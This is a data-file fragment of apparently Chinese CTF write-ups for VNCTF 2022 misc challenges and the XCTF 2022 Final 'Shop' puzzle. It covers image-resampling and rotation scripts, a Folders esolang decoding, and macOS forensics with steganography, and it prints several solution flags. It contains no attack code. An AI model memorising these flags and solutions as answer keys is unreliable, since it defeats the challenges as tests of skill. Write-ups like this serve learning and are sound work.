\u2588\u2588\u2588\u2588\u2588 \u2588\n\u2588         \u2588             \u2588     \u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss\nVNCTF{801f190737434100e7d2790bd5b0732e}\n</code></pre>"}, {"location": "writeups/vnctf2022/#_1", "title": "\u4ed4\u7ec6\u627e\u627e", "text": "\u9898\u76ee <p>\u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6</p> <p>\u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a<code>vnctf{34aE@w}</code></p> <p>\u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a <pre><code>from PIL import Image\nimg = Image.open(\"flag.png\")\nimg = img.resize((79, 71), Image.NEAREST)\nimg.show()\n</code></pre> \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86</p>"}, {"location": "writeups/vnctf2022/#strange-flag", "title": "Strange flag", "text": "<p>\u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4</p> <p>\u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a <pre><code>flag\n`-- New\\ folder\n    |-- New\\ folder\n    |   |-- New\\ folder\n    |   |-- New\\ folder\\ (2)\n    |   |-- New\\ folder\\ (3)\n    |   `-- New\\ folder\\ (4)\n    `-- New\\ folder\\ (2)\n        |-- New\\ Folder\\ (3)\n        |   |-- New\\ folder\n        |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder(2)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   |-- New\\ folder(3)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   `-- New\\ folder(4)\n        |   |   |       `-- New\\ folder\n        |   |   `-- New\\ folder(2)\n        |   |       |-- New\\ folder\n        |   |       |-- New\\ folder(2)\n        |   |       |   `-- New\\ folder\n        |   |       |-- New\\ folder(3)\n        |   |       |   `-- New\\ folder\n        |   |       `-- New\\ folder(4)\n        |   |-- New\\ folder(10)\n...\n</code></pre> \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f</p> <p>\u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a <pre><code>import os\nfrom pathlib import Path\n\nwith open(\"test\", \"r\") as f:\n    tree = f.readlines()\n\npath = Path(\"flag\")\nlast_level = -1\n\nfor each in tree:\n    level = each.find(\"N\")//4\n    if level &lt; last_level:\n        path = path.parent\n    if level == last_level:\n        path = path.parent\n    diff = last_level - level\n    for _ in range(diff):\n        path = path.parent\n    path = path / each.strip().replace(\"\\\\\", \"\")\n    last_level = level\n    os.makedirs(path)\n</code></pre> \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a<code>vnctf{d23903879df57503879bcdf1efc141fe}</code></p>"}, {"location": "writeups/vnctf2022/#prize-wheel", "title": "prize wheel", "text": "<p>\u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86</p> <p>\u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 <code>f6a623a2c577de3b46c079267d4bdd6e</code> \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09</p> \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 <p></p> <p>\u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247</p> \u9898\u76ee <p></p> <p>\u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247</p> <p>\u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165</p> \u6211\u7684\u5199\u6cd5 <p><pre><code>from PIL import Image\nfrom tqdm import tqdm\nimport sys\n\nimg = Image.open(\"flag.png\")\nwidth, height = img.size\nres = Image.new(\"RGBA\", (1220, 1220))\n\nlst = []\n\nfor i in range(width // 2 + 1):\n    for j in range(i, width - i):\n        lst.append(img.getpixel((i, j)))\n    for j in range(i + 1, width - i):\n        lst.append(img.getpixel((j, width-i-1)))\n    for j in range(width - i - 2, i, -1):\n        lst.append(img.getpixel((width-i-1, j)))\n    for j in range(width - i - 1, i, -1):\n        lst.append(img.getpixel((j, i)))\n\nlst = lst[::-1]\n\nwith tqdm(total=600) as pbar:\n    for times in range(600):\n        ptr = 0\n        res = Image.new(\"RGBA\", (610, 1221))\n        for j in range(1220):\n            for i in range(width-times):\n                try:\n                    res.putpixel((i, j), lst[ptr])\n                    ptr += 1\n                except:\n                    pass\n        pbar.update(1)\n        res.save(f\"res/-{times}.png\")\n</code></pre> \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684</p> <p>\u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf</p> <p>\u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a</p> \u6b63\u89e3 <p><pre><code>from PIL import Image\nimg = Image.open('flag.png')\nwidth, height = img.size\nc_x = width // 2\nc_y = height // 2\nfor count in range(3, width+1, 2):\n    print(count)\n    d = count // 2\n    for i in range((count-1)*4):\n        p_x = c_x - d\n        p_y = c_y - d\n        tmp0 = img.getpixel((width//2, c_y-count//2))\n        if tmp0[0] == 255 and tmp0[1] == 255 and tmp0[2] == 255:\n            break\n        tmp = img.getpixel((p_x, p_y))\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x+1, p_y))))\n            p_x += 1\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x, p_y+1))))\n            p_y += 1\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x-1, p_y))))\n            p_x -= 1\n        for j in range(count-2):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x, p_y-1))))\n            p_y -= 1\n        img.putpixel((p_x, p_y), tmp)\nimg.save(\"trueflag.png\")\n</code></pre> </p>"}, {"location": "writeups/vnctf2022/#simple-macos", "title": "simple macos", "text": "<p>\u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765</p> <p>macOS \u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6</p> <p>\u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a </p> <p>\u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: <pre><code>/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist\n/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey\n/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist\n</code></pre> \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09</p> <p>\u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765</p> <p>\u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e <code>nsllc_1s_s1MMple}</code>\uff08\u4e0d\u592a\u786e\u5b9a\uff09</p> <p>\u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: <code>VNCTF{Macos_Fore</code></p>"}, {"location": "writeups/xctf2022final/", "title": "XCTF 2022 Final Writeup", "text": "<p> \u7ea6 506 \u4e2a\u5b57  29 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u53ea\u505a\u4e86\u4e00\u9053 misc\uff0c\u86ee\u8c1c\u8bed\u7684\uff0c\u8fd8\u975e\u9884\u671f\u4e86</p>"}, {"location": "writeups/xctf2022final/#shop", "title": "Shop", "text": "<p>\u53ea\u6709 nc\uff0c\u5927\u6982\u7387\u7eaf\u731c\u8c1c\uff0c\u8fde\u63a5\u4e0a\u8981\u6c42\u8f93\u5165\u7528\u6237\u540d\uff0c\u4e4b\u540e\uff1a</p> <pre><code>What would you like to buy? TonyCrane\n\n    These are what you can buy.\n    no.0 1da price: 10\n    no.1 apple price: 2\n    no.2 f1ag price: 1999\n    no.3 banana price: 1\n    no.4 xctf price: 5\n    no.5 b3rpsu1t price: 3\n    no.6 0l0_3ider price: 108\n\nHow about some ('no.1 apple', 2) ?\nPlease input your good number:\n</code></pre> <p>\u76f4\u63a5\u9009 2 flag \u4f1a Please earn more!\uff0c\u4e00\u76f4\u9009 3 \u6216\u8005\u5176\u4ed6\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5f97\u5230\u521d\u59cb\u7684\u603b\u91d1\u989d\u662f 120\u3002</p> <p>\u5728\u4e00\u76f4\u4e70 0 \u7684\u65f6\u5019\u7b2c\u516d\u5929\u4f1a\u5f97\u5230 You eat too much 1da! What about trying something other? \u7136\u540e\u7ee7\u7eed\u9009 0 \uff0c\u7b2c\u5341\u6b21\u53ef\u4ee5\u5f97\u5230 You eat too much 1da and You triggered the hidden task: Get membership!</p> <p>\u6240\u4ee5\u8fd9\u65f6\u5c31\u89e6\u53d1\u4e86\u4e0b\u4e00\u4e2a\u4efb\u52a1\u4e5f\u5c31\u662f\u62ff\u5230\u4f1a\u5458\u3002\uff08\u5176\u5b9e\u8fd9\u91cc\u6709\u6697\u793a\u4f46\u5f53\u65f6\u6ca1\u6ce8\u610f\uff0c\u6700\u5f00\u5934\u8981\u6c42\u8f93\u5165\u7528\u6237\u540d\u7684\u65f6\u5019\u544a\u8bc9\u4e86\u4e0d\u80fd\u662f admin\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u957f\uff0c\u5b9e\u9645\u4e0a\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\u90fd\u4f1a\u6539\u4e3a Bob\uff0c\u5e76\u4e14\u8f93\u51fa\u4e00\u53e5\u201cDo not eat too much 1da!!!\u201d\u4f5c\u4e3a\u63d0\u793a\uff09</p> <p>\u7ecf\u8fc7\u591a\u79cd\u5c1d\u8bd5\u53ef\u4ee5\u77e5\u9053\u4ece\u8f93\u5165\u5f97\u5230\u9009\u9879\u7684\u505a\u6cd5\u662f\u53d6\u8f93\u5165\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6570\u5b57\u5b57\u7b26\uff0c\u800c\u4e14\u5982\u679c\u8d85\u8fc7 6 \u6216\u8005\u6839\u672c\u6ca1\u6709\u6570\u5b57\uff0c\u4f1a\u8f93\u51fa What? Sorry, you can not buy anything today. This may affect your membership(A **month** of continuous shopping)</p> <p>\u6240\u4ee5\u5927\u6982\u731c\u6d4b\u4f1a\u5458\u8981\u4e00\u4e2a\u6708\u624d\u80fd\u5f97\u5230\uff0c\u8fd9\u6837\u7684\u8bdd\u9009 10 \u6b21 0 \u89e6\u53d1\u4efb\u52a1\uff0c\u7136\u540e\u5269\u4e0b\u7684\u94b1\u6b63\u597d\u591f\u9009 20 \u6b21 3\uff0c\u8fd9\u6837 30 \u5929\u4e4b\u540e\u5c31\u62ff\u5230\u4f1a\u5458\u4e86\uff1a</p> <pre><code>Thanks!\nDear Membership TonyCrane\nI will show you my Recommendation system. It contains A super AI and I test it myself!\nBut before I show that, what about a easy game?\nYour answer is(Y/N):\n</code></pre> <p>\u8fd9\u91cc\u56de\u7b54\u662f Y/N \u90fd\u662f\u4e00\u6837\u7684\uff0c\u4f1a\u8ba9\u4f60\u53bb\u89e3\u4e00\u9053\u9898\u76ee\uff1a</p> <pre><code>Here is the game, please find my score(integer) to those goods which have 0 score:\n\nbeginmatrix\n[[27, 0, 20, 0, 11, 0, 31, 23, 10, 0, 0, 15, 0, 13], [26, 32, 21, 7, 15, 18, 32, 26, 13, 25, 22, 13, 13, 14], [40, 46, 39, 11, 27, 24, 46, 28, 23, 41, 32, 29, 35, 28], [23, 27, 17, 6, 10, 15, 27, 21, 9, 20, 21, 12, 15, 11], [35, 40, 25, 9, 13, 22, 40, 30, 12, 29, 33, 19, 26, 16], [42, 49, 32, 11, 19, 27, 49, 37, 17, 37, 38, 23, 29, 21], [43, 52, 42, 12, 32, 28, 52, 36, 27, 46, 33, 28, 29, 30], [30, 35, 25, 8, 16, 19, 35, 25, 14, 28, 26, 18, 22, 17]]\nendmatirx\nwhere row stand for user and col stand for goods\nThe good and user embedding dim are both 3!\nThe flag is md5(first row)\nExample: if the first row is [14 13  9 22 20 25 14 27 20 15 19 10 32 21] md5(141392220251427201519103221)==59d25d2c3cc2bb1d27f550329d35f5a5\nSo, the answer is 59d25d2c3cc2bb1d27f550329d35f5a5\nNow, what is your answer?\n</code></pre> <p>\u770b\u8d77\u6765\u548c AI \u4ee5\u53ca\u63a8\u8350\u7b97\u6cd5\u6709\u5173\uff0c\u641c\u4e86\u597d\u591a\u4e5f\u6ca1\u627e\u5230\uff0c\u5199\u4e0d\u51fa\u6765\u3002</p> <p>\u7136\u540e\u5728\u4e00\u6b21\u6b21\u5c1d\u8bd5\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u975e\u9884\u671f\uff08\u5927\u6982\u4e5f\u662f\u5f88\u591a\u961f\u505a\u51fa\u6765\u7684\u539f\u56e0\uff09\uff0c\u5728\u8fd9\u4e2a\u8f93\u51fa\u7684\u77e9\u9635\u4e2d\uff0c\u6709\u4e00\u5b9a\u6982\u7387\u4f1a\u51fa\u73b0\u4e24\u884c\u4e00\u6837\u7684\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u548c\u539f\u672c\u7b2c\u4e00\u884c\u4e00\u6837\u7684\u884c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7b54\u6848\u5c31\u76f4\u63a5\u6253\u51fa\u6765\u4e86\uff0cmd5 \u4e00\u4e0b\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u4e86\uff0c\u5f97\u5230 flag: flag{a2b035c8_congratulations+7618=on=528f1b1_solving_this&gt;814464a4c6812&lt;problem:D}</p> <p>\u9884\u671f\u5c31\u662f AI \u76f8\u5173\u7684\u63a8\u8350\u7cfb\u7edf\u77e9\u9635\u5206\u89e3\u7b97\u6cd5\uff0c\u6559\u7a0b\uff1ahttps://blog.csdn.net/weixin_43164078/article/details/124278175\u3002</p>"}]}